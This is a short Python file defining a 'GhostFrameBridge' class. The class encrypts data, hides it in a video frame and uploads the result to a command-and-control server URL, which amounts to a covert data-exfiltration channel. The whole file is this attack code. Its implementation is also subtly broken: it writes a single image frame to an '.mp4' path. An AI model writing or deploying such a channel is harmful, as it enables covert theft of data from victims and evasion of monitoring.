import cv2
import numpy as np
from modules.crypto import crypto_utils
from modules.network import network_manager

class GhostFrameBridge:
    def __init__(self, c2_url, shared_key):
        self.c2_url = c2_url
        self.shared_key = shared_key
        self.net = network_manager.NetworkManager()

    def hide_and_send(self, data, cover_video_path):
        encrypted_data = crypto_utils.encrypt(data, self.shared_key)
        cap = cv2.VideoCapture(cover_video_path)
        ret, frame = cap.read()
        if not ret:
            return False
        data_bytes = np.frombuffer(encrypted_data.encode(), dtype=np.uint8)
        frame[0, 0:len(data_bytes)] = data_bytes
        output_path = "hidden_data_video.mp4"
        cv2.imwrite(output_path, frame)
        response = self.net.upload_file(f"{self.c2_url}/api/v1/upload_media", output_path)
        return response.status_code == 200